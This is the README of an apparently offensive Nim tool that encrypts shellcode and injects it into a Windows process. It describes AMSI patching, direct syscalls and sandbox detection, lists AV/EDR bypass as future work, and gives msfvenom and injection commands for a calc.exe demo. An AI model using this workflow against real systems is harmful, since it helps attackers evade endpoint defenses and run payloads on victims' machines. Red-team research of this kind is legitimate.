Zouzounim
==========

Playing around with [Offensive Nim](https://github.com/byt3bl33d3r/OffensiveNim#reflectively-loading-nim-executables). I am just trying to play with nim and understand about WIN32 APIs. Sorry for the horrible code. PR are welcome !

Features:
* Base on the [shellcode injection of ajpc500](https://ajpc500.github.io/nim/Shellcode-Injection-using-Nim-and-Syscalls/)
* Direct syscalls for triggering Windows Native API functions with [NimlineWhispers2](https://github.com/ajpc500/NimlineWhispers2).
* Shellcode encryption/decryption with [AES in CTR mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)).
* Patching the AMSI with [Offensive Nim module](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim)
* Simple sandbox detection.

> **DISCLAIMER.** All information contained in this repository is provided for educational and research purposes only. The author is not responsible for any illegal use of this tool.

## Usage

Installation:
On **Windows**, execute the Nim installer from [here](https://nim-lang.org/install_windows.html). Make sure to install `mingw` and set the path values correctly using the provided `finish.exe` utility. If you don't have Python3 install that, then install the required packages as follows.

```console
~$ nimble install winim nimcrypto
~$ pip3 install pycryptodome argparse
~$ git clone --recurse-submodules https://github.com/Zeckers/ZouzouNim.git && cd ZouzouNim
```

Example:

```console
~$ msfvenom -a x64 --platform windows -p windows/exec cmd=calc.exe -f c -o shellcode.bin
~$ python.exe .\ZouzouNim.py shellcode.bin -o Basic_injector -r -p notepad.exe --debug
~$ Open notepad.exe 
~$ .\Basic_injector.exe
```

Help:

```
usage: ZouzouNim.py [-h] [-p PROCESS] [-o OUTPUT] [-r] [--debug] shellcode_bin

positional arguments:
  shellcode_bin         path to the raw shellcode file

optional arguments:
  -h, --help            show this help message and exit
  -p PROCESS, --process PROCESS
                        process to inject (default "C:\Windows\explorer.exe")
  -o OUTPUT, --output OUTPUT
                        output filename
  -r, --rdmsyscalls     use NimlineWhispers2 to randomize direct syscalls and generate syscalls.nim
  --debug               do not strip debug messages from Nim binary
```
## ToDo
* Adding fresh copy of ntdll (maybe shellycoat integration)
* Disable ETW
* Sleep time 
* Bypass AV/EDRs

Thanks to Cas Van Cooten (@chvancooten) for the help,@ajpc500 for the blog post and NimlineWhispers2 and @byt3bl33d3r for the amazing Offensive Nim repos